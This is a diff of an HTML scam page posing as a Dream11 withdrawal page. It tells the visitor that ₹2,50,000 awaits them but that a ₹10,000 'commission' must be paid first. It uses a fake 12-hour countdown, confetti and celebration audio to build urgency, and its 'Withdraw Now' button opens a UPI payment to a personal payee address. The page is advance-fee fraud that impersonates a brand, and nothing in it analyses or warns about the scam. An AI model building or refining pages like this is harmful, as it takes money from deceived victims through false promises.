@@ -8,55 +8,46 @@
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background-color: #d8232a;
-      color: #000;
+      background-color: #d6181f;
       display: flex;
       align-items: center;
       justify-content: center;
-      height: 100vh;
+      min-height: 100vh;
     }
-
-    .container {
-      background: white;
-      border-radius: 20px;
-      padding: 30px 20px;
+    .card {
+      background: #fff;
+      padding: 30px;
+      border-radius: 16px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
       text-align: center;
       max-width: 320px;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      width: 90%;
     }
-
     .logo {
-      font-size: 30px;
-      color: red;
-      font-weight: bold;
+      height: 60px;
       margin-bottom: 10px;
     }
-
-    .heading {
-      font-size: 20px;
-      font-weight: bold;
-      margin-bottom: 15px;
+    h2 {
+      margin: 10px 0;
     }
-
     .amount {
       font-size: 32px;
       color: green;
-      margin: 10px 0;
+      font-weight: bold;
     }
-
     .note {
-      font-size: 14px;
-      margin-bottom: 15px;
+      margin: 10px 0;
+      font-size: 15px;
+      color: #000;
     }
-
-    .countdown {
+    .timer {
       font-size: 18px;
       color: red;
-      margin-bottom: 20px;
+      font-weight: bold;
     }
-
     .btn {
-      padding: 12px 25px;
+      margin-top: 20px;
+      padding: 12px 20px;
       background-color: #28a745;
       color: white;
       border: none;
@@ -64,70 +55,100 @@
       font-size: 16px;
       cursor: pointer;
     }
-
     .expired {
-      color: gray;
       font-size: 20px;
+      color: red;
       font-weight: bold;
+    }
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      pointer-events: none;
+      z-index: 9999;
     }
   </style>
 </head>
 <body>
-  <div class="container" id="mainContent">
-    <div class="logo">D</div>
-    <div class="logo" style="font-size: 18px;">DREAM11</div>
-    <div class="heading">Withdrawal Page</div>
+  <div class="card" id="content">
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/f/fd/Dream11_Logo.svg/512px-Dream11_Logo.svg.png" class="logo" />
+    <h2>Withdrawal Page</h2>
     <p>Your withdrawal amount is:</p>
     <div class="amount">₹2,50,000</div>
-    <div class="note">You must pay ₹10,000 commission to proceed with withdrawal.</div>
-    <div class="countdown" id="timer">Time left: --:--:--</div>
-    <button class="btn" onclick="withdraw()">Withdraw Now</button>
+    <p class="note">You must pay ₹10,000 commission to proceed with withdrawal.</p>
+    <p class="timer" id="timer">Time left: --:--:--</p>
+    <button class="btn" id="withdrawBtn">Withdraw Now</button>
   </div>
 
-  <div class="container" id="expiredContent" style="display:none;">
-    <div class="expired">Link Expired</div>
-  </div>
+  <div class="expired" id="expiredMessage" style="display: none;">Link Expired</div>
 
-  <audio id="celebrationAudio" autoplay>
+  <canvas id="confetti"></canvas>
+
+  <!-- Celebration Music -->
+  <audio id="celebrationAudio" autoplay muted playsinline>
     <source src="12celebrate.mp3" type="audio/mp3" />
   </audio>
 
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
   <script>
-    function withdraw() {
-      window.location.href = "upi://pay?pa=ramchoudhary2315@ybl&pn=Ram&cu=INR";
+    const timerEl = document.getElementById("timer");
+    const withdrawBtn = document.getElementById("withdrawBtn");
+    const content = document.getElementById("content");
+    const expiredMsg = document.getElementById("expiredMessage");
+    const audio = document.getElementById("celebrationAudio");
+
+    // One-time link setup
+    let firstVisit = localStorage.getItem("withdrawalStart");
+    if (!firstVisit) {
+      const now = new Date().getTime();
+      localStorage.setItem("withdrawalStart", now);
+      firstVisit = now;
     }
 
-    const countdownEl = document.getElementById("timer");
-    const mainContent = document.getElementById("mainContent");
-    const expiredContent = document.getElementById("expiredContent");
+    const countdownTime = 12 * 60 * 60 * 1000; // 12 hours
+    const endTime = parseInt(firstVisit) + countdownTime;
 
-    const savedTime = localStorage.getItem("withdrawalStart");
-    const startTime = savedTime ? new Date(savedTime) : new Date();
-    if (!savedTime) {
-      localStorage.setItem("withdrawalStart", startTime);
-    }
-
-    const expireTime = new Date(startTime.getTime() + 12 * 60 * 60 * 1000);
-
-    function updateCountdown() {
-      const now = new Date();
-      const diff = expireTime - now;
+    function updateTimer() {
+      const now = new Date().getTime();
+      const diff = endTime - now;
 
       if (diff <= 0) {
-        mainContent.style.display = "none";
-        expiredContent.style.display = "block";
+        timerEl.style.display = "none";
+        withdrawBtn.style.display = "none";
+        content.style.display = "none";
+        expiredMsg.style.display = "block";
         return;
       }
 
-      const hours = Math.floor(diff / (1000 * 60 * 60));
-      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-      const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+      const hours = String(Math.floor(diff / (1000 * 60 * 60))).padStart(2, "0");
+      const mins = String(Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60))).padStart(2, "0");
+      const secs = String(Math.floor((diff % (1000 * 60)) / 1000)).padStart(2, "0");
 
-      countdownEl.textContent = `Time left: ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+      timerEl.textContent = `Time left: ${hours}:${mins}:${secs}`;
     }
 
-    setInterval(updateCountdown, 1000);
-    updateCountdown();
+    setInterval(updateTimer, 1000);
+    updateTimer();
+
+    // Confetti
+    confetti({
+      particleCount: 150,
+      spread: 80,
+      origin: { y: 0.6 }
+    });
+
+    // Withdraw Now action
+    withdrawBtn.onclick = () => {
+      window.location.href = "upi://pay?pa=ramchoudhary2315@ybl&pn=Withdrawal&cu=INR";
+    };
+
+    // Audio play fallback on click (for mobile)
+    audio.muted = false;
+    audio.play().catch(() => {
+      document.body.addEventListener("click", () => {
+        audio.play();
+      }, { once: true });
+    });
   </script>
 </body>
 </html>
